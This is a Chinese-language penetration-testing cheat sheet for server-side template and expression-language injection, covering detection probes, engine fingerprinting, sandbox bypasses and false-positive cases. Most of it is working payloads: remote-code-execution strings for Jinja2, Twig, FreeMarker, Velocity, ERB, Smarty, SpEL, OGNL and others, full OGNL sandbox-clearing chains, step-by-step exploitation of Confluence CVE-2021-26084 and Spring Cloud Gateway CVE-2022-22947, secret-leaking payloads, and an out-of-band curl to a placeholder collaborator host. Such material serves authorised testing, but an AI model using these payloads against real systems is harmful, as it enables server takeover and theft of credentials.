## 一、漏洞确认(摸这里能干什么,最重要)

**1. polyglot 探针(决定引擎族)**
- `{{7*7}}` → 49:Jinja2/Twig/Nunjucks/Handlebars/Vue(SSR)/Django(模板引擎)
- `${7*7}` → 49:FreeMarker/Mako(模板插值)**或** SpEL/OGNL/JavaEL(表达式求值器)——同 payload 不同引擎族,靠报错/框架区分(见下)
- `<%= 7*7 %>` → 49:Ruby ERB(模板)
- `{7*7}` → 49:Smarty(PHP 模板)
- `#{7*7}` → 49:SpEL(替代语法)/JSF EL(表达式)
- `%{7*7}` → 49:OGNL/Struts2(表达式)
- `${T(java.lang.Math).random()}` → 随机浮点 = SpEL 确认;`%{#context}` → 对象 dump = OGNL 确认
- 返 49 确认注入;返 `7777777`(7 重复)→ 模板递归不执行;返原样 → 未渲染/转义
- 二阶探针:`{{7*'7'}}` → Jinja2 返 `7777777`(字符串乘),Twig 返 `49`(数字乘)—— 区分引擎

**2. 引擎指纹(决定 gadget)**
- 报错指引擎:`TemplateSyntaxError`(Jinja2)/`Twig_Error_Syntax`(Twig)/`FreeMarkerException`(FreeMarker)/`ParseErrorException`(Velocity)/`ognl.OgnlException`(OGNL)/`SpelEvaluationException`(SpEL)/`javax.el.ELException`(JavaEL)/`org.thymeleaf.exceptions`(Thymeleaf SpEL)
- 文件扩展:`.jinja`/`.j2`/`.twig`/`.ftl`/`.vm`/`.erb`/`.tpl`(Smarty)
- 框架线索:Flask(Jinja2)/Symfony(Twig)/Rails(ERB)/Django;Spring(SpEL)/Struts2(OGNL)/Confluence(OGNL)/JSP-JSF(JavaEL)/Thymeleaf(Spring,SpEL)
- sink 画像:SpEL `@Value`/`@PreAuthorize`/Spring Cloud Gateway 路由 filter/Spring Data `@Query`;OGNL Struts2 参数/Content-Type;JavaEL JSP `${}`;Thymeleaf `th:text="${...}"` + `__${...}__` 预处理

**3. 沙箱在不在(决定升级方向)**
- Jinja2 `SandboxedEnvironment`/Twig sandbox/Twig 2.x+ 修 `registerUndefinedFilterCallback`
- SpEL `SimpleEvaluationContext`(限 `T()`)/Struts2 `SecurityMemberAccess` + OgnlUtil 黑名单
- 沙箱有 → 走绕过段

## 二、绕过思路(按校验类型对症)

- **拦 `{{}}`/`${}`/`%{}`/`#{}`**:换语法变体(`#{}` SpEL 替代/`%{}` OGNL/`#{}` JSF);Thymeleaf `__${...}__` 预处理表达式(渲染前求值,绕 `th:text` 转义);模板注释内嵌表达式
- **关键字黑名单**:`__class__`/`__subclasses__` 被禁 → `attr('__class__')`/字符串拼接 `['__cla'+'ss__']`/`|attr('__class__')`;字符串拼接绕类名黑名单;反射 `forName` 绕直接引用
- **沙箱逃逸 / 引擎专属 gadget**:
  - **Jinja2**:`{{''.__class__.__mro__[2].__subclasses__()}}` 找 `subprocess.Popen`/`os._wrap_close`;`{{config}}`/`{{request.application}}` 拿全局;`{{cycler.__init__.__globals__.os.popen('id').read()}}`
  - **Twig(1.x)**:`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`(2.x+ 修)
  - **FreeMarker**:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`(`#` 指令 + `${}` 插值);`?api`/`object_constructor`
  - **Velocity**:`#set($e="exp")$e.class.forName("java.lang.Runtime").getMethod("exec",$e.class).invoke(...,"id")`
  - **ERB**:`<%= system('id') %>`/`<%= \`id\` %>`/`<%= IO.popen('id').read %>`
  - **Smarty**:`{if system('id')}{/if}`;旧版 `{php}system('id');{/php}`(4.x 删)
  - **Mako**:`${self.module.cache.util.os.system('id')}`
  - **SpEL(Spring)**:`SimpleEvaluationContext` 限 `T()` → reflection bypass `${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}`;`ProcessBuilder` 替代 Runtime
  - **OGNL(Struts2/Confluence)**:`SecurityMemberAccess` 沙箱 → 清 `_memberAccess` `%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}`;较新版清 `excludedClasses`/`excludedPackageNames`
  - **JavaEL(JSP/JSF)**:`${Runtime.getRuntime().exec("id")}`;反射 `${"".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}`
  - **Thymeleaf(SpEL-based)**:`__${T(java.lang.Runtime).getRuntime().exec('id')}__` 预处理表达式

## 三、漏洞证明

### RCE(核心危害,按引擎选,先确认注入通了再用)
- **Jinja2**:`{{''.__class__.__mro__[2].__subclasses__()[N]('id',shell=True,stdout=-1).communicate()[0]}}`(找 subprocess.Popen 索引 N);`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig(1.x)**:`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **FreeMarker**:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- **ERB**:`<%= \`id\` %>`
- **Smarty**:`{if system('id')}{/if}`
- **SpEL**:`${T(java.lang.Runtime).getRuntime().exec("id")}`;输出捕获 Commons IO `${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}` 或 Spring StreamUtils `#{new String(T(...StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}`;Runtime 被拦走 `ProcessBuilder`
- **OGNL**:基础 `%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}`;沙箱绕过完整串 `%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}`;OgnlUtil 黑名单清除 `%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}`
- **JavaEL**:`${Runtime.getRuntime().exec("id")}`;pageContext `${pageContext.request.getServletContext().getClassLoader()}`
- **Thymeleaf**:`__${T(java.lang.Runtime).getRuntime().exec('id')}__`
- 命令标记验证:`echo 标记 && id`,不反弹(下次 render/spawn 后回包/日志出现标记或 `uid=`)

### CVE 矩阵(EL 求值器专属入口)
- **Struts2**:S2-045(Content-Type 头 `%{`)/S2-046(Multipart 文件名)/S2-016(`redirect:`/`redirectAction:` URL 参数)/S2-048(Showcase ActionMessage)/S2-057(Namespace URL 路径)
- **Confluence CVE-2021-26084**:`POST /pages/createpage-entervariables.action`,`queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027`(URL 解码 `'+{3*3}+'`),返 9 确认 → 升级 Runtime.exec
- **Spring Cloud Gateway CVE-2022-22947**(actuator 加 SpEL filter 路由,利用步骤固定 4 步):① `POST /actuator/gateway/routes/hacktest`(filter `AddResponseHeader` 的 `value` 放 SpEL `#{new String(T(...StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}`)② `POST /actuator/gateway/refresh` ③ `GET /hackpath` 响应头 `Result` 带命令输出 ④ `DELETE /actuator/gateway/routes/hacktest` + refresh 清理

### 信息泄露(下限,无 RCE 时)
- Jinja2 `{{config}}`(Flask SECRET_KEY/DB 连接)/`{{request}}`(headers/cookie)/`{{''.__class__.__mro__}}`(类继承链);FreeMarker `${.vars}`;SpEL 访问 config/环境;读环境/配置

### OOB(无回显)
- Jinja2 `{{''.__class__.__mro__[2].__subclasses__()[N]('curl http://BURP/$(id)')}}` → Collaborator 收到带 uid 的请求

### 危害升级(按站)
- 读凭证 `{{config}}` 拿 SECRET_KEY/DB 连接;写 webshell(Jinja2 popen);内网(Spring Cloud Gateway 路由转发);RCE 链反序列化

## 四、误报场景

- 参数当字符串(未渲染/未求值,`{{7*7}}`/`${7*7}` 原样返回)
- 客户端模板(前端 Vue/React 渲染,不是服务端注入)
- `${}` 命中模板引擎(FreeMarker/Mako 插值)还是表达式求值器(SpEL/OGNL)——靠报错/框架区分,不靠 payload 形态
- 沙箱严格拦(`__class__`/`subprocess` 被沙箱禁,或 SpEL `SimpleEvaluationContext` 限 `T()` 且 reflection 也被拦 → 只数学运算,不算 RCE)
- 引擎版本已修(Twig 2.x 修 `registerUndefinedFilterCallback`;Smarty 4.x 删 `{php}`;Confluence CVE-2021-26084 已补丁;Struts2 新版 OgnlUtil 黑名单覆盖)
- 输入校验拦(`{{}}`/`${}`/`%{}` 被 strip)
- 报错是模板/表达式语法错(≠ 注入成功,可能只是输入导致解析失败)
- Thymeleaf 未开预处理(`__${}__` 不生效,只 `th:text` 转义)
- actuator 未暴露(`/actuator/gateway` 404 → Spring Cloud Gateway CVE 不成立)
